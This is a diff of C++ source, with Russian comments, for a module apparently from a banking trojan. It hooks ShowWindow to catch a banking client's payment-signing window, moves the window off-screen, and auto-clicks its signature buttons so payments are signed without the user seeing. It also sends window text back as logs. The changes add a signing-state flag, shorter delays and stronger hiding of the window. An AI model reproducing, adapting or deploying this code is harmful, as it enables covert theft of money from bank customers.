@@ -27,14 +27,13 @@ namespace bsssign_Template
 //***********************************************************************
 namespace BSSSign
 {
-	// Дополнительные настройки модуля
 
 
 	// Делать скриншоты всплывающих окон системы
     //#define LOG_BSS_SIGN
 
 	// Определяем переменную включающую опцию прятания окна
-	#if !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
+	#ifndef DEBUGCONFIG
     	#define BSS_HIDE_WND
 	#endif
 
@@ -65,6 +64,7 @@ namespace BSSSign
 	bool Active = false; // Активность системы подписи
 	bool Blind  = false; // Использовать штору
 	bool Move   = false; // Двигать окно
+	bool SignState = false; // Признак того, что в данный момент идёт подпись
 	RECT WindowRect;
 
 
@@ -169,7 +169,7 @@ void BSSSignDoClickToButtons(HWND Form, DWORD &Count)
 		}
 
 		// Кликаем по кнопке
-		pSleep(900);
+		pSleep(500);
 	
 		if (ClickToWindow(Button, 5, 5))
 			Count++;
@@ -185,14 +185,18 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 	HWND Form = (HWND)Data;
 	if (Form == NULL) return 0;
 
+	SignState = true;
+
+	pSleep(2000);
+
 	BDBG("bsssign","Кликаем по кнопкам подписи");
 
 
-	#ifdef LOG_BSS_SIGN
-		LPBYTE Screen    = NULL;
-		DWORD ScreenSize = 0;
-		ScreenShot::PrintWindow2(Form, Screen, ScreenSize);
-	#endif
+//	#ifdef LOG_BSS_SIGN
+//		LPBYTE Screen    = NULL;
+//		DWORD ScreenSize = 0;
+//		ScreenShot::PrintWindow2(Form, Screen, ScreenSize);
+//	#endif
 
 	DWORD Count = 0;
 
@@ -215,21 +219,26 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 	// В случае если окно не закрылось от нажатия кнопок отсылаем
 	// сообщение закрытия окна
 	if (Visible)
+	{
+		#ifdef LOG_BSS_SIGN
+			// Отправляем отчёт
+			PLog Log = CreateStruct(TLog);
+			if (Visible)
+				Log->Type = STR::New(LogTypeBSSSignError);
+			Log->Text = GetAllWindowsText(Form, true, true);
+
+			SendLogAndDeleteData(Log);
+		#endif
+
 		pSendMessageW(Form, WM_CLOSE, 0, 0);
+    }
 
-#ifdef LOG_BSS_SIGN
-		// Отправляем отчёт
-		PLog Log = CreateStruct(TLog);
-		if (Visible)
-			Log->Type = STR::New(LogTypeBSSSignError);
-		Log->Screen = Screen;
-		Log->ScreenSize = ScreenSize;
-        Log->Text = GetAllWindowsText(Form, true, true);
 
-		SendLogAndDeleteData(Log);
-	#endif
 
     BDBG("bsssign","Подпись завершена. Нажато кнопок %d", Count);
+
+
+    SignState = false;
 
 	return 0;
 }
@@ -246,12 +255,14 @@ BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
 	PCHAR ClassName = GetWndClassName(Wnd);
     DWORD CNHash    = CalcHash(ClassName);
 
+	#ifdef DebugUtils
 	if (Cmd == SW_SHOW)
 	{
 		PCHAR Caption = GetWndText(Wnd);
 		BDBG("bsssign", "Отображается окно %s", Caption);
 		STR::Free(Caption);
 	}
+	#endif
 
 	if(Active)
 	{
@@ -304,18 +315,19 @@ BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
 	if (StartSign)
 	{
 		// Запускаем поток подписи
-
-		BSSSign::DoMoveWindow(Wnd, 0, 0);
 		#ifdef BSS_HIDE_WND
+			BSSSign::DoMoveWindow(Wnd, -1000, 0);
 			// Для отладки не прячем окно
-			SetWindowTransparent(Wnd, 1);
+			//SetWindowTransparent(Wnd, 1);
 		#endif
 
   		StartThread(SignPayment, Wnd);
 	}
 
 	#ifdef LOG_BSS_SIGN
-		if (!StartSign && CNHash != HASH_IE_SERVER)
+		// В случае если во время подписи показывается неизвестное окно
+		// то формируем и отправляем лог
+		if (!StartSign && SignState)
 		{
 			// Показывается неизвестное окно, отправляем отчёт
 			PLog Log  = CreateStruct(TLog);
@@ -445,6 +457,7 @@ void BSSSign::Initialize()
 	Active = false;
 	Blind  = false;
 	Move   = false;
+	SignState = false;
 
 	SetHooks();
 }
